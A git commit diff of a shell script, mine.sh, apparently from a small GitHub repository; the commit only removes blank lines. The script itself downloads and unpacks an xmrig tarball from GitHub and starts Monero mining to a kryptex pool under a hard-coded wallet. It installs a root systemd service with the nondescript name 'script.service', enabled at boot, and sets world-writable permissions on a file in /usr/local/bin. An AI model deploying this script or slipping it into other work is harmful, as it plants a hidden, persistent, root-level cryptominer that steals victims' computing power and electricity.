127f547fd44661b42e205ea98bc26d732248cc6a
Daemonium <66210793+realLifeInAnime@users.noreply.github.com>
2023-10-16 14:29:30 +0300

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -7,10 +7,8 @@ sudo chmod 777 /usr/local/bin/script.sh ;
 sudo wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar && sudo tar xvf output_filename.tar ;
 sleep 3 ;
 sudo chmod +x xmrig
-
 sudo echo "#!/bin/bash
 ./xmrig-6.18.0/xmrig -a randomx -o xmr.kryptex.network:7777 -u 41gm7v89Rw8W5AeCcBVj3yZnQhZSSJoPaKrfWC1oWyNeiPTGc7FGkHp7xUf8nn7jbAXo4YxYtb8V6WTa3h9oAxDWVADG37A.test --coin monero" > /usr/local/bin/script.sh ;
-
 sudo echo "[Unit]
 Description=Script
 After=network.target
@@ -22,7 +20,6 @@ User=root
 WorkingDirectory=/
 [Install]
 WantedBy=multi-user.target" > /etc/systemd/system/script.service;
-
 sudo systemctl daemon-reload;
 sudo systemctl start script.service;
 sudo systemctl enable script.service;'
